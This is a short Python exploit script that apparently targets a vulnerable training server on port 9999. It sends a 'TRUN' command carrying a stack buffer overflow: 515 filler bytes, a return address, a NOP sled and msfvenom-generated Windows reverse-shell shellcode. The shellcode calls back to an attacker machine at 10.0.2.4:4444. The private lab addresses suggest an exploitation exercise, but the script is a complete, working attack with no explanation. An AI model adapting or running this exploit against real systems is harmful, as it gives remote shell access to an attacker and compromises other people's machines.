#!/usr/bin/python
import sys
from socket import *

#the code in the overflow came from running the command: msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.4 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00" > shellcode

overflow = (
"\xd9\xf6\xd9\x74\x24\xf4\x58\xbf\xd5\x44\xac\x0e\x31\xc9\xb1"
"\x52\x31\x78\x17\x83\xc0\x04\x03\xad\x57\x4e\xfb\xb1\xb0\x0c"
"\x04\x49\x41\x71\x8c\xac\x70\xb1\xea\xa5\x23\x01\x78\xeb\xcf"
"\xea\x2c\x1f\x5b\x9e\xf8\x10\xec\x15\xdf\x1f\xed\x06\x23\x3e"
"\x6d\x55\x70\xe0\x4c\x96\x85\xe1\x89\xcb\x64\xb3\x42\x87\xdb"
"\x23\xe6\xdd\xe7\xc8\xb4\xf0\x6f\x2d\x0c\xf2\x5e\xe0\x06\xad"
"\x40\x03\xca\xc5\xc8\x1b\x0f\xe3\x83\x90\xfb\x9f\x15\x70\x32"
"\x5f\xb9\xbd\xfa\x92\xc3\xfa\x3d\x4d\xb6\xf2\x3d\xf0\xc1\xc1"
"\x3c\x2e\x47\xd1\xe7\xa5\xff\x3d\x19\x69\x99\xb6\x15\xc6\xed"
"\x90\x39\xd9\x22\xab\x46\x52\xc5\x7b\xcf\x20\xe2\x5f\x8b\xf3"
"\x8b\xc6\x71\x55\xb3\x18\xda\x0a\x11\x53\xf7\x5f\x28\x3e\x90"
"\xac\x01\xc0\x60\xbb\x12\xb3\x52\x64\x89\x5b\xdf\xed\x17\x9c"
"\x20\xc4\xe0\x32\xdf\xe7\x10\x1b\x24\xb3\x40\x33\x8d\xbc\x0a"
"\xc3\x32\x69\x9c\x93\x9c\xc2\x5d\x43\x5d\xb3\x35\x89\x52\xec"
"\x26\xb2\xb8\x85\xcd\x49\x2b\xa0\x11\x53\xaf\xdc\x13\x53\xbe"
"\x40\x9d\xb5\xaa\x68\xcb\x6e\x43\x10\x56\xe4\xf2\xdd\x4c\x81"
"\x35\x55\x63\x76\xfb\x9e\x0e\x64\x6c\x6f\x45\xd6\x3b\x70\x73"
"\x7e\xa7\xe3\x18\x7e\xae\x1f\xb7\x29\xe7\xee\xce\xbf\x15\x48"
"\x79\xdd\xe7\x0c\x42\x65\x3c\xed\x4d\x64\xb1\x49\x6a\x76\x0f"
"\x51\x36\x22\xdf\x04\xe0\x9c\x99\xfe\x42\x76\x70\xac\x0c\x1e"
"\x05\x9e\x8e\x58\x0a\xcb\x78\x84\xbb\xa2\x3c\xbb\x74\x23\xc9"
"\xc4\x68\xd3\x36\x1f\x29\xf3\xd4\xb5\x44\x9c\x40\x5c\xe5\xc1"
"\x72\x8b\x2a\xfc\xf0\x39\xd3\xfb\xe9\x48\xd6\x40\xae\xa1\xaa"
"\xd9\x5b\xc5\x19\xd9\x49")

shellcode = "A" * 515 + "\xF3\x12\x17\31" +"\x90" * 32 + overflow

#nops (padding bytes => \x90 *32 )

try: 
        s=socket(AF_INET, SOCK_STREAM)
        s.connect(('10.0.2.14', 9999))

        s.send(('TRUN /.:/' + shellcode))
        s.close
except:
        print("Error connecting to server!")
        sys.exit()
